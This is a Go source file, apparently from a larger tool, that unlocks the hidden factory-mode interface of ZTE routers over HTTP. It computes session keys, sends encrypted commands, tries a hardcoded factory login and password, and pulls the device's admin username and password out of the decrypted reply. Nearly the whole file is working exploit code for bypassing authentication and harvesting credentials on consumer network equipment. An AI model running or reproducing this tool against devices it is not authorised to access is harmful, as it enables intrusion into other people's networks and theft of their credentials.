package main

import (
	"bytes"
	"encoding/hex"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	"strconv"
	"strings"
	"time"
)

type httpResp struct {
	StatusCode int
	Content    []byte
}

type webFac struct {
	host    string
	port    int
	mac     []byte
	timeout time.Duration
	verbose bool
}

func newWebFac(host string, port int, mac []byte, timeout float64, verbose bool) *webFac {
	return &webFac{
		host:    host,
		port:    port,
		mac:     mac,
		timeout: dur(timeout),
		verbose: verbose,
	}
}

func (w *webFac) log(format string, a ...interface{}) {
	if w.verbose {
		fmt.Printf(format+"\n", a...)
	}
}

func (w *webFac) post(path string, body []byte, timeout time.Duration) (*httpResp, error) {
	t := timeout
	if t <= 0 {
		t = w.timeout
	}
	cli := &http.Client{Timeout: t}
	req, err := http.NewRequest(http.MethodPost,
		fmt.Sprintf("http://%s:%d%s", w.host, w.port, path), bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	req.Header.Set("User-Agent", "zte")
	req.Header.Set("Content-Type", "text/plain")
	req.Header.Set("Referer", fmt.Sprintf("http://%s/login.html", w.host))

	resp, err := cli.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	content, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}
	return &httpResp{StatusCode: resp.StatusCode, Content: content}, nil
}

func (w *webFac) reset() bool {
	r, err := w.post("/webFac", []byte("SendSq.gch"), 2*time.Second)
	if err != nil {
		return true
	}
	return r.StatusCode == 400
}

func (w *webFac) requestFactoryMode() (*httpResp, error) {
	return w.post("/webFac", []byte("RequestFactoryMode.gch"), dur(5.0))
}

func (w *webFac) sendSq(rand60 int) (*httpResp, error) {
	return w.post("/webFac", latin1Bytes(fmt.Sprintf("SendSq.gch?rand=%d\r\n", rand60)), 0)
}

func (w *webFac) postEnc(key, plain []byte) (*httpResp, error) {
	ct, err := aesEncrypt(key, plain)
	if err != nil {
		return nil, err
	}
	return w.post("/webFacEntry", ct, 0)
}

func (w *webFac) decrypt(key []byte, resp *httpResp, expect []byte) ([]byte, bool, bool) {
	if resp == nil || len(resp.Content) == 0 {
		return nil, false, false
	}
	n := len(resp.Content) / 16 * 16
	if n == 0 {
		return nil, false, false
	}
	dec, err := aesDecrypt(key, resp.Content[:n])
	if err != nil {
		return nil, false, false
	}
	ok := printableRatio(dec) >= 0.8
	hit := expect == nil || bytes.HasPrefix(dec, expect)
	return dec, ok, hit
}

type result struct {
	OK        bool
	CredUser  string
	CredPass  string
	HasCred   bool
	Core      string
	Variant   string
	Seed      int
	Rand60    int
	Step4Code int
	Step4Set  bool
	Steps     map[int]bool
	Failed    []int
	Error     string
}

func newResult() *result { return &result{Steps: map[int]bool{}} }

func (r *result) finish() *result {
	r.Failed = nil
	for _, i := range []int{1, 2, 3, 4, 5} {
		if r.Steps[i] != true {
			r.Failed = append(r.Failed, i)
		}
	}
	return r
}

func (r *result) step4String() string {
	if !r.Step4Set {
		return "None"
	}
	return strconv.Itoa(r.Step4Code)
}

type runConfig struct {
	Host       string
	Port       int
	MAC        string
	User       string
	PW         string
	Mode       int
	FMUser     string
	Version    *string
	MagicMAC   string
	RandVal    *int
	NoSendInfo *bool
	InfoMagic  *bool
	InfoSimple bool
	SlaveIP    string
	Close      bool
	Timeout    float64
	Verbose    bool
	Rnd        *rand.Rand
	Progress   func(n int, ok bool, note string)
}

func run(cfg runConfig) *result {
	rnd := cfg.Rnd
	if rnd == nil {
		rnd = rand.New(rand.NewSource(time.Now().UnixNano()))
	}
	res := newResult()
	wf := newWebFac(cfg.Host, cfg.Port, normMACStr(cfg.MAC), cfg.Timeout, cfg.Verbose)

	mark := func(n int, ok bool, note string) {
		res.Steps[n] = ok
		if cfg.Progress != nil {
			cfg.Progress(n, ok, note)
		}
	}

	if wf.mac == nil {
		res.Error = "mac"
		return res.finish()
	}

	verS := "76"
	if cfg.Version != nil {
		v, why := normVersion(*cfg.Version)
		if v == "" {
			res.Error = "version: " + why
			return res.finish()
		}
		verS = v
	}

	tail5 := ""
	if cfg.SlaveIP != "" {
		sip, why := normSlaveIP(cfg.SlaveIP)
		if sip == "" {
			res.Error = "slaveip: " + why
			return res.finish()
		}
		tail5 = "&slaveip=" + sip
	}

	rand60 := 0
	if cfg.RandVal != nil {
		rand60 = *cfg.RandVal
	} else {
		rand60 = rnd.Intn(60)
	}
	res.Rand60 = rand60
	wf.log("    rand60 = %d (client nonce, 0-59)", rand60)

	wf.reset()
	time.Sleep(dur(0.2))

	r1, err := wf.requestFactoryMode()
	if err != nil {
		wf.log("    S1 connection failed: %v", err)
		mark(1, true, "(no response)")
	} else if r1.StatusCode != 200 {
		mark(1, false, "")
		return res.finish()
	} else {
		mark(1, true, "")
	}
	time.Sleep(dur(0.2))

	r2, err := wf.sendSq(rand60)
	if err != nil {
		wf.log("    S2 connection failed: %v", err)
		mark(2, false, "")
		return res.finish()
	}
	txt := r2.Content
	mark(2, r2.StatusCode == 200, "")
	wf.log("    S2 response = %d, %d bytes: %q", r2.StatusCode, len(r2.Content), trunc(r2.Content, 80))
	if r2.StatusCode != 200 {
		return res.finish()
	}

	core := detectCore(txt)
	res.Core = core
	siMod := rsaByCore[core][0]
	siExp := rsaByCore[core][1]

	skipSI := core == "A"
	if cfg.NoSendInfo != nil {
		skipSI = *cfg.NoSendInfo
	}
	useMagic := core == "B"
	if cfg.InfoMagic != nil {
		useMagic = *cfg.InfoMagic
	}
	if cfg.Version == nil && (core == "B" || core == "A") && verS == "76" {
		verS = "50"
	}

	var serverMAC []byte
	var rsa rsaKey
	hasRSA := false
	var nr int

	if bk, ok := branchKey[core]; ok {
		idx := bytes.Index(txt, []byte(bk.Tag))
		var val []byte
		if idx >= 0 && idx+bk.Off <= len(txt) {
			val = txt[idx+bk.Off:]
		}
		nr = calcSeed(rand60, val)
		res.Variant = fmt.Sprintf("%s(%s)", core, strings.TrimSuffix(bk.Tag, "="))
		wf.log("    %s = %q -> seed = ((rand60=%d * 0x1000193) %% 64 ^ %d) %% 60 = %d",
			bk.Tag, trunc(val, 40), rand60, atoiDec(val), nr)

		if core == "C" {
			parts := bytes.SplitN(val, []byte("&"), 3)
			if len(parts) < 3 {
				res.Error = "re_rand has fewer than 3 segments"
				return res.finish()
			}
			wf.log("    re_rand segments: 1=%s 2=%s 3=MAC", parts[0], parts[1])
			rsa = rsaGen(rnd, siMod)
			hasRSA = true
			serverMAC = trunc(parts[2], 6)
			if len(serverMAC) < 6 {
				res.Error = "C branch did not return a MAC"
				return res.finish()
			}
			wf.log("    device MAC = %s (6 raw bytes)", macStr(serverMAC))
			wf.log("    client RSA: p=%d q=%d n=%d e=%d d=%d",
				rsa.P, rsa.Q, rsa.N, rsa.E, rsa.D)
		}
	} else {
		nr = rand60
		res.Variant = "A(init)"
		wf.log("    no branch token in response -> seed = rand60 = %d (used directly)", nr)
	}
	res.Seed = nr

	key, kerr := deriveKey(keyPoolByCore[core], nr, 24)
	if kerr != nil {
		res.Error = kerr.Error()
		return res.finish()
	}
	wf.log("    branch=%s core=%s seed=%d keyPool=%s", res.Variant, core, nr, keyPoolByCore[core])
	wf.log("    AES-192 key = %s", hex.EncodeToString(key))

	if serverMAC == nil {
		serverMAC = make([]byte, 6)
	}
	seq := buildSeq(wf.mac, "aabb")

	if !hasRSA && !useMagic && !skipSI && !cfg.InfoSimple {
		rsa = rsaGen(rnd, siMod)
		hasRSA = true
	}

	var plain []byte
	switch {
	case cfg.InfoSimple:
		plain = []byte("SendInfo.gch?info=6|")
		wf.log("    [simple] payload = %q (no body, N=6)", plain)
	case useMagic:
		m := wf.mac
		if cfg.MagicMAC == "server" && !bytes.Equal(serverMAC, make([]byte, 6)) {
			m = serverMAC
		}
		seg, words, err := buildMagic(m, []int{0x7c4, 0x6ca, 0x495, 0x84e, 0x1cd, 0x827})
		if err != nil {
			res.Error = "magic: " + err.Error()
			return res.finish()
		}
		plain = append([]byte(fmt.Sprintf("SendInfo.gch?info=%d|", len(words))), seg...)
		wf.log("    [magic] MAC=%s N=%d", macStr(trunc(m, 6)), len(words))
	case !skipSI:
		plain = buildSendInfo(serverMAC, seq, rsa, siExp, siMod)
		if parts := bytes.SplitN(plain, []byte("info="), 2); len(parts) == 2 {
			n3, _ := strconv.Atoi(string(bytes.SplitN(parts[1], []byte("|"), 2)[0]))
			if core == "B" && n3%6 != 0 {
				wf.log("    N=%d, N%%6!=0: the B branch may reject it", n3)
			}
		}
	}

	if skipSI {
		mark(3, true, "(SendInfo skipped)")
	} else {
		r3, err := wf.postEnc(key, plain)
		if err != nil {
			wf.log("    S3 connection failed: %v", err)
			mark(3, false, "")
			mark(4, false, "")
			mark(5, false, "")
			return res.finish()
		}
		code3 := r3.StatusCode
		mark(3, code3 == 200, "")
		wf.log("    S3 plaintext %d bytes: %q", len(plain), trunc(plain, 56))
		wf.log("    S3 response = %d, %d bytes", code3, len(r3.Content))
		if code3 != 200 {
			if core == "A" && cfg.NoSendInfo != nil && !*cfg.NoSendInfo {
				skipSI = true
			} else {
				mark(4, false, "")
				mark(5, false, "")
				return res.finish()
			}
		}
	}

	type attempt struct {
		user string
		pw   string
		afmt string
	}
	attempts := []attempt{{cfg.User, cfg.PW, ""}}
	if core == "A" {
		attempts = append(attempts,
			attempt{"factorymode", "nE%jA@5b", ""},
			attempt{cfg.User, cfg.PW, "version"},
			attempt{"factorymode", "nE%jA@5b", "version"})
	}

	for ai, at := range attempts {
		p4 := plainStep4(verS, at.user, at.pw, core, at.afmt)
		r4, err := wf.postEnc(key, p4)
		if err != nil {
			wf.log("    S4 connection failed: %v", err)
			if ai == 0 {
				mark(4, false, "")
				mark(5, false, "")
				return res.finish()
			}
			break
		}
		code4 := r4.StatusCode
		res.Step4Code = code4
		res.Step4Set = true
		d4, decOK, _ := wf.decrypt(key, r4, []byte("FactoryMode.gch"))
		wf.log("    S4 plaintext %d bytes: %q", len(p4), p4)
		wf.log("    S4 response = %d, %d bytes", code4, len(r4.Content))
		if len(d4) > 0 {
			wf.log("    S4 decrypted = %q", trunc(d4, 100))
		}
		if code4 == 200 && decOK {
			note := ""
			if ai != 0 {
				note = fmt.Sprintf("(accepted on format %d)", ai+1)
			}
			mark(4, true, note)
			break
		}
		if code4 != 401 && code4 != 400 {
			mark(4, false, "")
			break
		}
		if ai == len(attempts)-1 {
			mark(4, false, fmt.Sprintf("(all %d formats rejected)", len(attempts)))
		} else {
			wf.log("    step4=%d, retrying with format %d", code4, ai+2)
		}
	}

	var p5 []byte
	if cfg.Close {
		p5 = latin1Bytes("FactoryMode.gch?close" + tail5)
	} else {
		p5 = plainStep5(cfg.Mode, cfg.FMUser, tail5, core)
	}
	r5, err := wf.postEnc(key, p5)
	if err != nil {
		wf.log("    S5 connection failed: %v", err)
		mark(5, false, "")
		return res.finish()
	}
	mark(5, r5.StatusCode == 200, "")
	wf.log("    S5 plaintext %d bytes: %q", len(p5), p5)
	wf.log("    S5 response = %d, %d bytes", r5.StatusCode, len(r5.Content))
	d5, _, _ := wf.decrypt(key, r5, nil)
	if len(d5) > 0 {
		wf.log("    S5 decrypted = %q", trunc(d5, 120))
	}
	if len(d5) > 0 && bytes.Contains(d5, []byte("user=")) && bytes.Contains(d5, []byte("pass=")) {
		if u := bytes.SplitN(d5, []byte("user="), 2); len(u) == 2 {
			if p := bytes.SplitN(d5, []byte("pass="), 2); len(p) == 2 {
				res.CredUser = latin1String(bytes.SplitN(u[1], []byte("&"), 2)[0])
				res.CredPass = latin1String(bytes.SplitN(p[1], []byte("&"), 2)[0])
				res.HasCred = true
				res.OK = true
			}
		}
	}
	return res.finish()
}

func dur(sec float64) time.Duration { return time.Duration(sec * float64(time.Second)) }
